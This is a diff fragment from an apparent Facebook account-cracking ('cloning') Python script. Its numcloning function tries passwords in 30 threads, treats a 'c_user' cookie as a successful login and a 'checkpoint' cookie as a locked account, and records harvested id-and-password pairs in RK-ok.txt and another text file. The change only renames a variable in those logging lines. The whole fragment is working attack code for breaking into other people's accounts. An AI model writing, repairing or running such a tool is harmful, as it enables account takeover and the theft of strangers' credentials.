@@ -230,17 +230,17 @@ def numcloning():
             if 'c_user' in rana.cookies.get_dict().keys():
                 print ("\x1b[1;92m[RK-OK] "+coc+user + " | " + pass1)
                 ok=open('RK-ok.txt', 'a')
-                ok.write(uid+ " | " +pass1+ "\n")
+                ok.write(cid+ " | " +pass1+ "\n")
                 ok.close()
-                oks.append(uid+pass1)
+                oks.append(cid+pass1)
             else:
                 if 'checkpoint' in rana.cookies.get_dict().keys():
                     
                     print ("\x1b[1;91m[RK-CP] "+coc+user + " | " + pass1)
                     cp=open('RK random-co.txt', 'a')
-                    cp.write(uid+ " | " +pass1+ "\n")
+                    cp.write(cid+ " | " +pass1+ "\n")
                     cp.close()
-                    cps.append(uid+pass1)
+                    cps.append(cid+pass1)
         except:
             pass
     p = ThreadPool(30)
